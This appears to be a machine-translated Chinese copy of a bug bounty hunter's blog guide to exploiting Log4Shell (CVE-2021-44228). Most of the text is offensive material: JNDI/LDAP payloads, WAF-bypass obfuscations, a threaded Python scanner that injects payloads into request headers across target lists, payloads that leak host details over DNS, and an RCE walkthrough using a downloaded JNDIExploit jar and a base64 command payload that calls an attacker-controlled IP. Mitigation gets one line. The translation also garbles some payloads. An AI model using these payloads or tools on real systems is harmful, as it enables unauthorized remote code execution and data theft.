<html>
<head>
<title>Log4shell Zero-Day Exploit— Full Guide</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Log4shell零日漏洞利用—完整指南</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/log4shell-zero-day-exploit-full-guide-3a505f0c4248?source=collection_archive---------1-----------------------#2021-12-14">https://infosecwriteups.com/log4shell-zero-day-exploit-full-guide-3a505f0c4248?source=collection_archive---------1-----------------------#2021-12-14</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="90ec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好。我叫图欣·博斯(<a class="ae kl" href="https://instagram.com/tuhin1729" rel="noopener ugc nofollow" target="_blank"> @tuhin1729 </a>)。我是一名网络安全研究员和bug赏金猎人。在这篇文章中，我将描述被称为<a class="ae kl" href="https://www.lunasec.io/docs/blog/log4j-zero-day/" rel="noopener ugc nofollow" target="_blank"> Log4Shell </a>的关键零日漏洞，该漏洞存在于被数百万Java应用程序广泛使用的Java日志库<a class="ae kl" href="https://logging.apache.org/log4j/" rel="noopener ugc nofollow" target="_blank"> Log4j </a>中。所以不浪费时间，让我们开始吧:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/d0f5620fcf799fe73f68b5ee881d5ee8.png" data-original-src="https://miro.medium.com/v2/resize:fit:920/format:webp/1*d2S93X6t7QnbVB4afqu14w.jpeg"/></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">tuhin1729</figcaption></figure><h1 id="a367" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">Log4j是什么？</h1><p id="513f" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">Apache <a class="ae kl" href="https://logging.apache.org/log4j/" rel="noopener ugc nofollow" target="_blank"> Log4j </a>是一个基于Java的日志记录实用程序，最初由Ceki Gülcü编写。它是Apache日志服务的一部分，Apache日志服务是Apache软件基金会的一个项目。Log4j是几个Java日志框架中的一个，它被互联网上数以百万计的Java应用程序广泛使用。</p><h1 id="9b07" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">Log4shell是什么？</h1><p id="c825" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">周四(12月9日)，在流行的Java日志库log4j (v2)中发现了一个为期0天的漏洞，该漏洞通过记录特定字符串导致远程代码执行(RCE)。这一天是和发布在GitHub<a class="ae kl" href="https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce" rel="noopener ugc nofollow" target="_blank">上的POC一起发布的。现已公布为</a><a class="ae kl" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" rel="noopener ugc nofollow" target="_blank">CVE-2021–44228</a>。这个漏洞通常被称为Log4Shell漏洞。受影响的Log4j版本是2.0-beta 9&lt;= Apache Log4j&lt;= 2 . 14 . 1。2.15.0版修复了这个bug。</p><h1 id="3007" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">利用要求:</h1><ul class=""><li id="73a6" class="mb mc iq jp b jq lw ju lx jy md kc me kg mf kk mg mh mi mj bi translated">log4j版本易受攻击的服务器。</li><li id="3e65" class="mb mc iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated">具有任何协议(HTTP、TCP等)的端点，允许攻击者发送漏洞字符串。</li><li id="fde7" class="mb mc iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated">从该请求中注销字符串的日志记录语句。</li></ul><h1 id="eb87" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">去哪里打猎？</h1><p id="8923" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">找出任何可能被记录的字段。例如，你正在访问的端点，用户代理，推荐人，你搜索的东西，你以某种形式提交的东西，等等。</p><h1 id="0ecb" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">怎么打猎？</h1><p id="144a" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">要检测此漏洞，只需在一些参数、用户代理、推荐人、搜索栏、不同的输入字段中插入您的有效负载(在3xx响应的情况下，请确保遵循重定向)。如果您的collaborator中有DNS交互，那么它可能是易受攻击的。我们将用于检测目的的有效负载是:$ { JNDI:LDAP://XYZ . burpcollaborator . net/a }</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/4d0ec4542cf358c3bddc3316c12e2b98.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r6ez3ctcPqyvEmYkMJwVPA.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">log4shell</figcaption></figure><p id="04ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">[这里的“id”只是我使用的一个随机参数]</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/b0ec567935b27455963a539347b35c35.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HlubQi7hmkPOiU1jVKnI4g.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">log4shell</figcaption></figure><p id="cc7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">希望你从这两张截图中清楚地了解了如何寻找这个漏洞。你也可以用金丝雀来检测。</p><h1 id="37b7" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">晶片旁路:</h1><p id="fe36" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">要绕过Web应用程序防火墙，您可以使用以下有效负载:</p><pre class="kn ko kp kq gt mu mv mw mx aw my bi"><span id="3acf" class="mz kz iq mv b gy na nb l nc nd">${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}<br/>${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}<br/>${jndi:rmi://adsasd.asdasd.asdasd}<br/>${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}<br/>${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}<br/>${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}<br/>${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}</span></pre><h1 id="c724" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">怎么自动化？</h1><p id="77e2" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">要自动消除此漏洞，您可以使用以下代码:</p><pre class="kn ko kp kq gt mu mv mw mx aw my bi"><span id="8894" class="mz kz iq mv b gy na nb l nc nd">from sys import argv<br/>from requests import get<br/>from urllib3 import disable_warnings<br/>from concurrent.futures import ThreadPoolExecutor</span><span id="7118" class="mz kz iq mv b gy ne nb l nc nd">disable_warnings()</span><span id="e0f4" class="mz kz iq mv b gy ne nb l nc nd">proxies = {"http": "<a class="ae kl" href="http://127.0.0.1:8080" rel="noopener ugc nofollow" target="_blank">http://127.0.0.1:8080</a>", "https": "<a class="ae kl" href="http://127.0.0.1:8080" rel="noopener ugc nofollow" target="_blank">http://127.0.0.1:8080</a>"}</span><span id="858e" class="mz kz iq mv b gy ne nb l nc nd">def sendDetectionRequest(url, urlId):<br/>    try:<br/>        payload = '${jndi:ldap://' + str(urlId) + '.' + argv[2] + '/a}'<br/>        params = {'id':payload}<br/>        headers = {'User-Agent':payload, 'Referer':payload, 'X-Api-Version':payload, 'X-Forwarded-For':payload} #You_may_add_other_headers_here.<br/>        url = url.strip()<br/>        print('[{}] Testing {}'.format(urlId, url))<br/>        get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)<br/>    except Exception as e:<br/>        print(e)<br/>        pass</span><span id="6238" class="mz kz iq mv b gy ne nb l nc nd">threads = []<br/>urlId = 0<br/>if len(argv) &gt; 1:<br/>    urlFile = open(argv[1], 'r')<br/>    urlList = urlFile.readlines()<br/>    with ThreadPoolExecutor(max_workers=15) as executor:<br/>        for url in urlList:<br/>            urlId += 1<br/>            threads.append(executor.submit(sendDetectionRequest, url, urlId))<br/>else:<br/>    print('[!] Syntax: python3 {} &lt;urlFile&gt; &lt;collaboratorPayload&gt;'.format(argv[0]))</span></pre><p id="9863" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要记住的事情:<br/> i .确保你的打嗝是打开的，并且监听端口8080(否则你可以注释掉代理)。<br/>二。您需要一个目标列表(不要忘记在您的目标后面添加协议)。<br/>三世。语法:</p><pre class="kn ko kp kq gt mu mv mw mx aw my bi"><span id="ca59" class="mz kz iq mv b gy na nb l nc nd">python3 log4shell.py targets.txt xyz.burpcollaborator.net</span></pre><p id="332f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，在您的合作者中，如果您获得了域名为137.xyz.burpcollaborator.net的DNS交互，那么您列表中的第137个目标就是易受攻击的。<br/>你也可以试试这个:【https://github.com/fullhunt/log4j-scan】T4</p><h1 id="2596" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">如何剥削？</h1><p id="b7fd" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">在直接进入RCE之前，我们将尝试获取目标的Java版本和os名称。为了获取操作系统名称，我们将使用这个有效负载:$ { JNDI:LDAP://$ { sys:OS . name } . XYZ . burpcollaborator . net/a }</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/1c04d911de8e480c44a9d5d992e9465a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Go1AZdDwzInAX0uA5jouvQ.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">os.name</figcaption></figure><p id="22a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了获得Java版本，我们将使用这个版本:$ { JNDI:LDAP://$ { sys:Java . version } . XYZ . burpcollaborator . net/a }</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/0e3086dd48638fd55bdd5376ef8a6ed9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R5pjGJUNU15QdZtM4KdIBg.png"/></div></div></figure><p id="21c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您也可以尝试使用以下有效负载提取主机名:$ { JNDI:LDAP://$ { hostName } . XYZ . burpcollaborator . net/a }</p><h2 id="c3ae" class="mz kz iq bd la nf ng dn le nh ni dp li jy nj nk lm kc nl nm lq kg nn no lu np bi translated">远程代码执行:</h2><p id="b3fa" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">为了执行任意命令，我们需要一个VPS。对于这个博客，我们将使用AWS EC2。首先，我们将创建一个AWS EC2实例。我用Debian 10。为了安全起见，我将打开所有端口(否则您可能只打开端口22、80、443、1389和8888)。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi nq"><img src="../Images/32d5e58120bc17ebf04403bacdffcbf4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AF-YHoJxj6HkC6zZxBSMtA.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">自动警报系统</figcaption></figure><p id="8271" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们将ssh到我们的EC2实例中。请确保在登录后运行更新和升级。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/f5e3deff408f7b7f2a52658a4bc31faf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xlih5Y-AQzwCgubnxVaEZQ.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">自动警报系统</figcaption></figure><p id="5ceb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们将安装zip、apache2和java。</p><pre class="kn ko kp kq gt mu mv mw mx aw my bi"><span id="a4c3" class="mz kz iq mv b gy na nb l nc nd">sudo apt-get install apache2<br/>sudo apt-get install default-jre<br/>sudo apt-get install zip<br/>sudo service apache2 start</span></pre><p id="efa8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在在您的实例中下载这个<a class="ae kl" href="https://anonfiles.com/xd07G204v9/JNDIExploit.v1.2_zip" rel="noopener ugc nofollow" target="_blank"> zip文件</a>并解压缩。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/12d4efe4a579df865ef78ffe3d60640c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jvIzJdtdhWuyMlx989z2uQ.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">自动警报系统</figcaption></figure><p id="261f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，为了启动我们的ldap服务器，我们将使用:</p><pre class="kn ko kp kq gt mu mv mw mx aw my bi"><span id="419c" class="mz kz iq mv b gy na nb l nc nd">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i YOUR_PUBLIC_IP -p 8888</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/9d35d9fc1ea215a0a85645105e31f255.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xiyX8KkLwieg6NflEce61Q.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">自动警报系统</figcaption></figure><p id="4718" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在一切都完成了。我们只需要注入有效载荷。我们将使用的有效负载是:$ { JNDI:LDAP://YOUR _ PUBLIC _ IP:1389/Basic/Command/Base64/Base64 _ ENCODED _ Command }</p><p id="56ec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">比方说，我想执行whoami命令。首先，我们将用base64编码我们的命令:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/fdc48a4b2099e65928527426f4731818.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fqPfK8CR_eAUxrkCpewu6w.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">base64</figcaption></figure><p id="71ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们将在我们的目标中使用这个有效负载:$ { JNDI:LDAP://184 . 73 . 9 . 177:1389/Basic/Command/Base64/cgluzybgd 2 hvyw 1 pyc 5 lewcznnl 1 nnl 0 z 21 id 21 lnxo 0y 25 qztrodm 5 symeuynvycngnvbgxhy m 9 yyxrvci 5 uzxq = }</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/94a2bc9e74f31d8135751309d42c97f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rGUJ2k4vnqBVBTs2A80xiA.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">log4shell</figcaption></figure><p id="e543" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，我们的命令在服务器上执行。在您的实例中，您将看到类似这样的内容:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/8932dd79a9dd0ba4aaf4a2ba8ae5c2dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lRlBgaJrzFY0Ib76VFkXrA.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">自动警报系统</figcaption></figure><h1 id="9379" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">缓解措施:</h1><p id="0f45" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">log4j的2.15.0版已经发布，没有该漏洞。一定要尽快更新。</p><p id="9d78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编辑:这不再是“零日”了。补丁已经发布了！所以，现在姑且称之为‘漏洞’吧。</p><h1 id="8434" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">参考资料:</h1><p id="8cdb" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">[1]<a class="ae kl" href="https://www.lunasec.io/docs/blog/log4j-zero-day/" rel="noopener ugc nofollow" target="_blank">https://www.lunasec.io/docs/blog/log4j-zero-day/</a><br/>【2】<a class="ae kl" href="https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce" rel="noopener ugc nofollow" target="_blank">https://github . com/Tang Xiaofeng 7/CVE-2021-44228-Apache-Log4j-Rce</a></p><p id="976d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Twitter上关注我:@ <a class="ae kl" href="https://twitter.com/tuhin1729_" rel="noopener ugc nofollow" target="_blank"> tuhin1729 </a> _</p><p id="8043" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢阅读。我希望你喜欢这个博客。</p></div></div>    
</body>
</html>